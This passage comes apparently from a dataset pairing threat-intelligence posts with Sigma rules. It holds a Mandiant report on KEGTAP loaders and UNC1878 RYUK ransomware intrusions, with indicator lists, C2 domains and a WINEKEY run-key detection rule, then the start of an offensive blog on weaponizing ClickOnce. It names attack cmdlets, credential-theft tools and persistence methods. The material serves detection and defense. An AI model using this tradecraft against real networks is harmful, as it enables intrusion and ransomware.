possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware.\n\n### Establish Foothold\n\nOnce the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle.\n\n### Maintain Presence\n\nBeyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit, and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot.\n\n- The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using `/setnotifycmdline`, and adding itself to the Userinit value under the following registry key:\n  - `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`\n- Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents.\n- We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor.\n- The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot.\n- In at least one case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication.\n\n### Escalate Privileges\n\nThe most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts.\n\n- The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON.\n- Actors have gained access to credentials via exported copies of the `ntds.dit` Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller.\n- In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet.\n\n### Reconnaissance\n\nThe approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND, or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON.\n\n- BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include:\n  - `Get-GPPPassword`\n  - `Invoke-AllChecks`\n  - `Invoke-BloodHound`\n  - `Invoke-EternalBlue`\n  - `Invoke-FileFinder`\n  - `Invoke-HostRecon`\n  - `Invoke-Inveigh`\n  - `Invoke-Kerberoast`\n  - `Invoke-LoginPrompt`\n  - `Invoke-mimikittenz`\n  - `Invoke-ShareFinder`\n  - `Invoke-UserHunter`\n- Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including `ipconfig`, `findstr`, and `cmd.exe`.\n- The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials.\n- WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture.\n- The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to `res.txt`.\n- The actors used the `Nltest` command to list domain controllers.\n\n### Lateral Movement\n\nLateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP, and SMB, or using the same backdoors used to establish a foothold in victim networks.\n\n- The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments.\n- The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols.\n- The actors used the Windows `net use` command to connect to Windows admin shares to move laterally.\n\n### Complete Mission\n\nMandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment.\n\n- In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server.\n- The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files.\n- The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise.\n- The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis.\n\n## Hunting Strategies\n\nIf an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel.\n\n- Isolate and perform a forensic review of any impacted systems.\n- Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes.\n- Identify the URLs used by the phishing campaign and block them using proxy or network security devices.\n- Reset credentials for any user accounts associated with execution of the malware.\n- Perform an enterprise-wide review for lateral movement authentication from the impacted systems.\n- Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc.) and move towards multi-factor authentication (MFA) as soon as possible.\n\nAn enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows.\n\nActivity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.\n\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk\n```\n\n*Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders*\n\nSINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host, run the command `bitsadmin /list`.\n\n- Display name may be “Adobe Update”, “System autoupdate” or another generic value.\n- Notify state may be set to Fail (Status 2).\n- FileList URL value may be set to the local host or a URL that does not exist.\n- The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it.\n- The Retry Delay value will be set.\n\nWINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware.\n\n```\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr\n\nValue: Path to the backdoor\n```\n\n*Figure 4: Example registry RUN key used by WINEKEY to maintain persistence*\n\nThe ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case.\n\n- The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: `<Random directory within %APPDATA%> autoupdate#<random number>`.\n- All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise.\n\nAlthough it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the `C:\\Windows\\SysWOW64` directory that have a file name matching the following pattern: `<8 random lowercase chars>.exe`. Stacking or sorting on file creation timestamps in the `C:\\Windows\\SysWOW64` directory may also help identify malicious files, as the directory should be mostly static.\n\nPost-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence.\n\nThe following are additional strategies that may aid in identifying associated activity:\n\n- Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration, or communication services with a referrer from a Google Docs document.\n- During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share.\n- While collecting data used to enable later-stage operations, the attackers commonly leave instances of `ntds.dit` and exports of the SYSTEM and SECURITY registry hives on impacted systems.\n\n## Hardening Strategies\n\nThe actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper.\n\n- Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation.\n- Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins. Actors often pick just a few accounts to use for RDP; by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor.\n- Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON.\n- Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that does not have a business categorization.\n- Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.\n\nFor more intelligence on ransomware and other threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform. Check out this episode of *State of the Hack* for additional information on this threat.\n\n## Campaign Indicators\n\n### Sample Email Subjects / Patterns\n\n- `<(first|last)-name>: Important Information`\n- `<Company Name>`\n- `<Company Name> complaint`\n- `<(first|last)-name>`\n- Agreement cancellation message\n- Agreement suspension notice\n- Contract cancellation reminder\n- FW: `<Name>` Annual Bonus Report is Ready\n- RE: `<(first|last)-name>`: Your Payslip for October\n- RE: `<Company Name>` Employee Survey\n- RE: `<Name>` termination list\n- RE: `<Company Name>` office\n- RE: Urgent `<Company Name>` Employee Internal Survey\n- RE: Working schedule adjustment\n- RE: Your Payslip for September\n\n### Example Malware Family MD5s\n\n- **KEGTAP**\n  - `df00d1192451268c31c1f8568d1ff472`\n- **BEERBOT**\n  - `6c6a2bfa5846fab374b2b97e65095ec9`\n- **SINGLEMALT**\n  - `37aa5690094cb6d638d0f13851be4246`\n- **STILLBOT**\n  - `3176c4a2755ae00f4fffe079608c7b25`\n- **WINEKEY**\n  - `9301564bdd572b0773f105287d8837c4`\n- **CORKBOT**\n  - `0796f1c1ea0a142fc1eb7109a44c86cb`\n\n### Code Signing Certificate CNs\n\n- ARTBUD RADOM SP Z O O\n- BESPOKE SOFTWARE SOLUTIONS LIMITED\n- Best Fud, OOO\n- BlueMarble GmbH\n- CHOO FSP, LLC\n- Company Megacom SP Z O O\n- ESTELLA, OOO\n- EXON RENTAL SP Z O O\n- Geksan LLC\n- GLOBAL PARK HORIZON SP Z O O\n- Infinite Programming Limited\n- James LTH d.o.o.\n- Logika OOO\n- MADAS d.o.o.\n- MUSTER PLUS SP Z O O\n- NEEDCODE SP Z O O\n- Nordkod LLC\n- NOSOV SP Z O O\n- OOO MEP\n- PLAN CORP PTY LTD\n- REGION TOURISM LLC\n- RESURS-RM OOO\n- Retalit LLC\n- Rumikon LLC\n- SNAB-RESURS, OOO\n- TARAT d.o.o.\n- TES LOGISTIKA d.o.o.\n- VAS CO PTY LTD\n- VB CORPORATE PTY. LTD.\n- VITA-DE d.o.o.\n\n## UNC1878 Indicators\n\nA significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group.\n\n### BEACON C2s\n\n| First Seen | Domain                         |\n| ---------- | ------------------------------ |\n| 12/11/19   | updatemanagir[.]us             |\n| 12/20/19   | cmdupdatewin[.]com             |\n| 12/26/19   | scrservallinst[.]info          |\n| 1/10/20    | winsystemupdate[.]com          |\n| 1/11/20    | jomamba[.]best                 |\n| 1/13/20    | updatewinlsass[.]com           |\n| 1/16/20    | winsysteminfo[.]com            |\n| 1/20/20    | livecheckpointsrs[.]com        |\n| 1/21/20    | ciscocheckapi[.]com            |\n| 1/28/20    | timesshifts[.]com              |\n| 1/29/20    | cylenceprotect[.]com           |\n| 1/30/20    | sophosdefence[.]com            |\n| 1/30/20    | taskshedulewin[.]com           |\n| 1/30/20    | windefenceinfo[.]com           |\n| 1/30/20    | lsasswininfo[.]com             |\n| 1/30/20    | update-wind[.]com              |\n| 1/30/20    | lsassupdate[.]com              |\n| 1/30/20    | renovatesystem[.]com           |\n| 1/31/20    | updatewinsoftr[.]com           |\n| 2/2/20     | cleardefencewin[.]com          |\n| 2/2/20     | checkwinupdate[.]com           |\n| 2/2/20     | havesetup[.]net                |\n| 2/3/20     | update-wins[.]com              |\n| 2/3/20     | conhostservice[.]com           |\n| 2/4/20     | microsoftupdateswin[.]com      |\n| 2/4/20     | iexploreservice[.]com          |\n| 2/12/20    | avrenew[.]com                  |\n| 2/12/20    | target-support[.]online        |\n| 2/12/20    | web-analysis[.]live            |\n| 2/14/20    | freeallsafe[.]com              |\n| 2/17/20    | windefens[.]com                |\n| 2/17/20    | defenswin[.]com                |\n| 2/17/20    | easytus[.]com                  |\n| 2/17/20    | greattus[.]com                 |\n| 2/17/20    | livetus[.]com                  |\n| 2/17/20    | comssite[.]com                 |\n| 2/17/20    | findtus[.]com                  |\n| 2/17/20    | bigtus[.]com                   |\n| 2/17/20    | aaatus[.]com                   |\n| 2/17/20    | besttus[.]com                  |\n| 2/17/20    | firsttus[.]com                 |\n| 2/17/20    | worldtus[.]com                 |\n| 2/26/20    | freeoldsafe[.]com              |\n| 2/26/20    | serviceupdates[.]net           |\n| 2/26/20    | topserviceupdater[.]com        |\n| 2/27/20    | myserviceupdater[.]com         |\n| 2/29/20    | myservicebooster[.]net         |\n| 2/29/20    | servicesbooster[.]org          |\n| 2/29/20    | brainschampions[.]com          |\n| 2/29/20    | myservicebooster[.]com         |\n| 2/29/20    | topservicesbooster[.]com       |\n| 2/29/20    | servicesbooster[.]com          |\n| 2/29/20    | topservicesecurity[.]org       |\n| 2/29/20    | topservicesecurity[.]net       |\n| 2/29/20    | topsecurityservice[.]net       |\n| 2/29/20    | myyserviceupdater[.]com        |\n| 2/29/20    | topservicesupdate[.]com        |\n| 2/29/20    | topservicesecurity[.]com       |\n| 2/29/20    | servicesecurity[.]org          |\n| 2/29/20    | myserviceconnect[.]net         |\n| 3/2/20     | topservicesupdates[.]com       |\n| 3/2/20     | yoursuperservice[.]com         |\n| 3/2/20     | topservicehelper[.]com         |\n| 3/2/20     | serviceuphelper[.]com          |\n| 3/2/20     | serviceshelpers[.]com          |\n| 3/2/20     | boostsecuritys[.]com           |\n| 3/3/20     | hakunamatatata[.]com           |\n| 3/8/20     | service-updater[.]com          |\n| 3/9/20     | secondserviceupdater[.]com     |\n| 3/9/20     | twelvethserviceupdater[.]com   |\n| 3/9/20     | twentiethservicehelper[.]com   |\n| 3/9/20     | twelfthservicehelper[.]com     |\n| 3/9/20     | tenthservicehelper[.]com       |\n| 3/9/20     | thirdserviceupdater[.]com      |\n| 3/9/20     | thirdservicehelper[.]com       |\n| 3/9/20     | tenthserviceupdater[.]com      |\n| 3/9/20     | thirteenthservicehelper[.]com  |\n| 3/9/20     | seventeenthservicehelper[.]com |\n| 3/9/20     | sixteenthservicehelper[.]com   |\n| 3/9/20     | sixthservicehelper[.]com       |\n| 3/9/20     | seventhservicehelper[.]com     |\n| 3/9/20     | seventhserviceupdater[.]com    |\n| 3/9/20     | sixthserviceupdater[.]com      |\n| 3/9/20     | secondservicehelper[.]com      |\n| 3/9/20     | ninthservicehelper[.]com       |\n| 3/9/20     | ninethserviceupdater[.]com     |\n| 3/9/20     | fourteenthservicehelper[.]com  |\n| 3/9/20     | fourthserviceupdater[.]com     |\n| 3/9/20     | firstserviceupdater[.]com      |\n| 3/9/20     | firstservisehelper[.]com       |\n| 3/9/20     | fifthserviceupdater[.]com      |\n| 3/9/20     | eleventhserviceupdater[.]com   |\n| 3/9/20     | fifthservicehelper[.]com       |\n| 3/9/20     | fourservicehelper[.]com        |\n| 3/9/20     | eighthservicehelper[.]com      |\n| 3/9/20     | eighteenthservicehelper[.]com  |\n| 3/9/20     | eighthserviceupdater[.]com     |\n| 3/9/20     | fifteenthservicehelper[.]com   |\n| 3/9/20     | nineteenthservicehelper[.]com  |\n| 3/9/20     | eleventhservicehelper[.]com    |\n| 3/14/20    | thirdservice-developer[.]com   |\n| 3/14/20    | fifthservice-developer[.]com   |\n| 3/15/20    | firstservice-developer[.]com   |\n| 3/16/20    | fourthservice-developer[.]com  |\n| 3/16/20    | ninethservice-developer[.]com  |\n| 3/16/20    | seventhservice-developer[.]com |\n| 3/16/20    | secondservice-developer[.]com  |\n| 3/16/20    | sixthservice-developer[.]com   |\n| 3/16/20    | tenthservice-developer[.]com   |\n| 3/16/20    | eithtservice-developer[.]com   |\n| 3/17/20    | servicedupdater[.]com          |\n| 3/17/20    | service-updateer[.]com         |\n| 3/19/20    | sexyservicee[.]com             |\n| 3/19/20    | serviceboostnumberone[.]com    |\n| 3/19/20    | servicedbooster[.]com          |\n| 3/19/20    | service-hunter[.]com           |\n| 3/19/20    | servicedhunter[.]com           |\n| 3/19/20    | servicedpower[.]com            |\n| 3/19/20    | sexycservice[.]com             |\n| 3/23/20    | yourserviceupdater[.]com       |\n| 3/23/20    | top-serviceupdater[.]com       |\n| 3/23/20    | top-servicebooster[.]com       |\n| 3/23/20    | serviceshelps[.]com            |\n| 3/23/20    | servicemonsterr[.]com          |\n| 3/23/20    | servicehunterr[.]com           |\n| 3/23/20    | service-helpes[.]com           |\n| 3/23/20    | servicecheckerr[.]com          |\n| 3/23/20    | newservicehelper[.]com         |\n| 3/23/20    | huntersservice[.]com           |\n| 3/23/20    | helpforyourservice[.]com       |\n| 3/23/20    | boostyourservice[.]com         |\n| 3/26/20    | developmasters[.]com           |\n| 3/26/20    | actionshunter[.]com            |\n| 5/4/20     | info-develop[.]com             |\n| 5/4/20     | ayechecker[.]com               |\n| 5/4/20     | service-booster[.]com          |\n| 9/18/20    | zapored[.]com                  |\n| 9/22/20    | gtrsqer[.]com                  |\n| 9/22/20    | chalengges[.]com               |\n| 9/22/20    | caonimas[.]com                 |\n| 9/22/20    | hakunaman[.]com                |\n| 9/22/20    | getinformationss[.]com         |\n| 9/22/20    | nomadfunclub[.]com             |\n| 9/22/20    | harddagger[.]com               |\n| 9/22/20    | errvghu[.]com                  |\n| 9/22/20    | reginds[.]com                  |\n| 9/22/20    | gameleaderr[.]com              |\n| 9/22/20    | razorses[.]com                 |\n| 9/22/20    | vnuret[.]com                   |\n| 9/22/20    | regbed[.]com                   |\n| 9/22/20    | bouths[.]com                   |\n| 9/23/20    | ayiyas[.]com                   |\n| 9/23/20    | serviceswork[.]net             |\n| 9/23/20    | moonshardd[.]com               |\n| 9/23/20    | hurrypotter[.]com              |\n| 9/23/20    | biliyilish[.]com               |\n| 9/23/20    | blackhoall[.]com               |\n| 9/23/20    | checkhunterr[.]com             |\n| 9/23/20    | daggerclip[.]com               |\n| 9/23/20    | check4list[.]com               |\n| 9/24/20    | chainnss[.]com                 |\n| 9/29/20    | hungrrybaby[.]com              |\n| 9/30/20    | martahzz[.]com                 |\n| 10/1/20    | jonsonsbabyy[.]com             |\n| 10/1/20    | wondergodst[.]com              |\n| 10/1/20    | zetrexx[.]com                  |\n| 10/1/20    | tiancaii[.]com                 |\n| 10/1/20    | cantliee[.]com                 |\n| 10/1/20    | realgamess[.]com               |\n| 10/1/20    | maybebaybe[.]com               |\n| 10/1/20    | saynoforbubble[.]com           |\n| 10/1/20    | chekingking[.]com              |\n| 10/1/20    | rapirasa[.]com                 |\n| 10/1/20    | raidbossa[.]com                |\n| 10/1/20    | mountasd[.]com                 |\n| 10/1/20    | puckhunterrr[.]com             |\n| 10/1/20    | pudgeee[.]com                  |\n| 10/1/20    | loockfinderrs[.]com            |\n| 10/1/20    | lindasak[.]com                 |\n| 10/1/20    | bithunterr[.]com               |\n| 10/1/20    | voiddas[.]com                  |\n| 10/1/20    | sibalsakie[.]com               |\n| 10/1/20    | giveasees[.]com                |\n| 10/1/20    | shabihere[.]com                |\n| 10/1/20    | tarhungangster[.]com           |\n| 10/1/20    | imagodd[.]com                  |\n| 10/1/20    | raaidboss[.]com                |\n| 10/1/20    | sunofgodd[.]com                |\n| 10/1/20    | rulemonster[.]com              |\n| 10/1/20    | loxliver[.]com                 |\n| 10/1/20    | servicegungster[.]com          |\n| 10/1/20    | kungfupandasa[.]com            |\n| 10/2/20    | check1domains[.]com            |\n| 10/5/20    | sweetmonsterr[.]com            |\n| 10/5/20    | qascker[.]com                  |\n| 10/7/20    | remotessa[.]com                |\n| 10/7/20    | cheapshhot[.]com               |\n| 10/7/20    | havemosts[.]com                |\n| 10/7/20    | unlockwsa[.]com                |\n| 10/7/20    | sobcase[.]com                  |\n| 10/7/20    | zhameharden[.]com              |\n| 10/7/20    | mixunderax[.]com               |\n| 10/7/20    | bugsbunnyy[.]com               |\n| 10/7/20    | fastbloodhunter[.]com          |\n| 10/7/20    | serviceboosterr[.]com          |\n| 10/7/20    | servicewikii[.]com             |\n| 10/7/20    | secondlivve[.]com              |\n| 10/7/20    | quwasd[.]com                   |\n| 10/7/20    | luckyhunterrs[.]com            |\n| 10/7/20    | wodemayaa[.]com                |\n| 10/7/20    | hybriqdjs[.]com                |\n| 10/7/20    | gunsdrag[.]com                 |\n| 10/7/20    | gungameon[.]com                |\n| 10/7/20    | servicemount[.]com             |\n| 10/7/20    | servicesupdater[.]com          |\n| 10/7/20    | service-boosterr[.]com         |\n| 10/7/20    | serviceupdatter[.]com          |\n| 10/7/20    | dotmaingame[.]com              |\n| 10/12/20   | backup1service[.]com           |\n| 10/13/20   | bakcup-monster[.]com           |\n| 10/13/20   | bakcup-checker[.]com           |\n| 10/13/20   | backup-simple[.]com            |\n| 10/13/20   | backup-leader[.]com            |\n| 10/13/20   | backup-helper[.]com            |\n| 10/13/20   | service-checker[.]com          |\n| 10/13/20   | nasmastrservice[.]com          |\n| 10/14/20   | service-leader[.]com           |\n| 10/14/20   | nas-simple-helper[.]com        |\n| 10/14/20   | nas-leader[.]com               |\n| 10/14/20   | boost-servicess[.]com          |\n| 10/14/20   | elephantdrrive[.]com           |\n| 10/15/20   | service-hellper[.]com          |\n| 10/16/20   | top-backuphelper[.]com         |\n| 10/16/20   | best-nas[.]com                 |\n| 10/16/20   | top-backupservice[.]com        |\n| 10/16/20   | bestservicehelper[.]com        |\n| 10/16/20   | backupnas1[.]com               |\n| 10/16/20   | backupmastter[.]com            |\n| 10/16/20   | best-backup[.]com              |\n| 10/17/20   | viewdrivers[.]com              |\n| 10/19/20   | topservicebooster[.]com        |\n| 10/19/20   | topservice-masters[.]com       |\n| 10/19/20   | topbackupintheworld[.]com      |\n| 10/19/20   | topbackup-helper[.]com         |\n| 10/19/20   | simple-backupbooster[.]com     |\n| 10/19/20   | top3-services[.]com            |\n| 10/19/20   | backup1services[.]com          |\n| 10/21/20   | backupmaster-service[.]com     |\n| 10/21/20   | backupmasterservice[.]com      |\n| 10/21/20   | service1updater[.]com          |\n| 10/21/20   | driverdwl[.]com                |\n| 10/21/20   | backup1master[.]com            |\n| 10/21/20   | boost-yourservice[.]com        |\n| 10/21/20   | checktodrivers[.]com           |\n| 10/21/20   | backup1helper[.]com            |\n| 10/21/20   | driver1updater[.]com           |\n| 10/21/20   | driver1master[.]com            |\n| 10/23/20   | view-backup[.]com              |\n| 10/23/20   | top3servicebooster[.]com       |\n| 10/23/20   | servicereader[.]com            |\n| 10/23/20   | servicehel[.]com               |\n| 10/23/20   | driver-boosters[.]com          |\n| 10/23/20   | service1update[.]com           |\n| 10/23/20   | service-hel[.]com              |\n| 10/23/20   | driver1downloads[.]com         |\n| 10/23/20   | service1view[.]com             |\n| 10/23/20   | backups1helper[.]com           |\n| 10/25/20   | idriveview[.]com               |\n| 10/26/20   | debug-service[.]com            |\n| 10/26/20   | idrivedwn[.]com                |\n| 10/28/20   | driverjumper[.]com             |\n| 10/28/20   | service1boost[.]com            |\n| 10/28/20   | idriveupdate[.]com             |\n| 10/28/20   | idrivehepler[.]com             |\n| 10/28/20   | idrivefinder[.]com             |\n| 10/28/20   | idrivecheck[.]com              |\n| 10/28/20   | idrivedownload[.]com           |\n\n---\n\nPosted in Threat Intelligence, Security & Identity",
    "sigma_rule": {
      "title": "WINEKEY Registry Modification",
      "id": "b98968aa-dbc0-4a9c-ac35-108363cbf8d5",
      "status": "test",
      "description": "Detects potential malicious modification of run keys by winekey or team9 backdoor",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "omkar72",
      "date": "2020-10-30",
      "modified": "2021-11-27",
      "tags": [
        "attack.persistence",
        "attack.t1547"
      ],
      "logsource": {
        "category": "registry_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr"
        },
        "condition": "selection"
      },
      "fields": [
        "ComputerName",
        "Image",
        "EventType",
        "TargetObject"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_event\\registry_event_runkey_winekey.yml",
    "id": "928"
  },
  {
    "url": "https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5",
    "markdown": "# Less SmartScreen More Caffeine: (Ab)Using ClickOnce for Trusted Code Execution\n\nThe contents of this blogpost was written by Nick Powers (@zyn3rgy) and Steven Flores (@0xthirteen), and is a written version of the content presented at Defcon30.\n\nWith the barrier to entry for initial access ever increasing, we spent some time digging into potentially lesser-known weaponization options for ClickOnce deployments. A few of the hurdles we’d like to overcome by implementing these weaponization options include:\n\n- Install / execute application without administrative privileges\n- Reputable, known-good file(s) used during execution\n- Streamlined, minimal user interaction required\n- Ease of rerolling execution implementations\n\nUltimately, we want to take a relatively common initial access technique known as ClickOnce and extend its value for the offensive use case by abusing the trust of third-party applications.\n\n---\n\n## ClickOnce Overview and Current Weaponizations\n\n> “ClickOnce is a deployment technology that enables you to create self-updating Windows-based applications that can be installed and run with minimal user interaction” - MSDN\n\nClickOnce is a vehicle for installing and updating .NET applications. Deployments can be published through a variety of options (e.g. network file shares, legacy media [CD-ROM], and web pages). We will be focusing on the web page method of publishing deployments. Legitimate applications exist and make use of ClickOnce deployments for installation or updating software such as Chrome (previously), Fidelity, and others.\n\nClickOnce deployments rely on manifests which are formatted in a very specific way. Just like .NET applications, there will be different types of manifests that need to be accounted for. There are three types of manifest to become familiar with when discussing ClickOnce deployments:\n\n> ClickOnce deployment manifests\n\n- *.application is the file extension for these\n- References the ClickOnce application manifest to deploy\n- APPREF-MS file will point to this (if used)\n\n> ClickOnce application manifests\n\n- *.exe.manifest is the file extension for these\n- Specifies dependencies for the deployment (states version of .NET that will be utilized)\n- Conducts integrity check of deployment manifest\n- References to dependencies and other files for delivery\n\n> Embedded application and assembly manifests\n\n- Application manifest can also be called unmanaged or fusion manifest\n- Assembly manifest can also be called managed manifest\n- At runtime, ClickOnce makes comparisons against these\n\n```image\nAlt: Embedded Assembly Manifest\nDescription: The image displays a segment of code written in C# that is related to .NET assembly attributes. It includes various assembly attributes like AssemblyVersion, AssemblyTitle, AssemblyDescription, and others which are essential for defining the properties and metadata of a .NET assembly. The code snippet also contains references to the system's configuration settings and assemblies needed for the execution of the program, specifically a tool named 'CasPol.exe' which is part of the .NET Framework.\nTranscription: |\n  // C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\CasPol.exe\n  // caspol, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\n  // Entry point: Microsoft.Tools.caspol.caspol.Main\n  // Timestamp: SDD4A1DE (11/4/2019 8:39:58 AM)\n  \n  using System;\n  using System.Diagnostics;\n  using System.Reflection;\n  using System.Resources;\n  using System.Runtime.CompilerServices;\n  using System.Runtime.InteropServices;\n  \n  [assembly: AssemblyVersion(\"4.0.0.0\")]\n  [assembly: CompilationRelaxations(8)]\n  [assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]\n  [assembly: ComVisible(false)]\n  [assembly: CLSCompliant(true)]\n  [assembly: AssemblyTitle(\"caspol.exe\")]\n  [assembly: AssemblyDescription(\"caspol.exe\")]\n  [assembly: AssemblyCompany(\"Microsoft Corporation\")]\n  [assembly: AssemblyProduct(\"Microsoft .NET Framework\")]\n  [assembly: AssemblyCopyright(\"@ Microsoft Corporation. All rights reserved.\")]\n  [assembly: AssemblyFileVersion(\"4.8.4084.0\")]\n  [assembly: AssemblyInformationalVersion(\"4.8.4084.0\")]\n  [assembly: SatelliteContractVersion(\"4.0.0.0\")]\n  [assembly: NeutralResourcesLanguage(\"en-US\")]\n  [assembly: AssemblyDelaySign(true)]\n  [assembly: 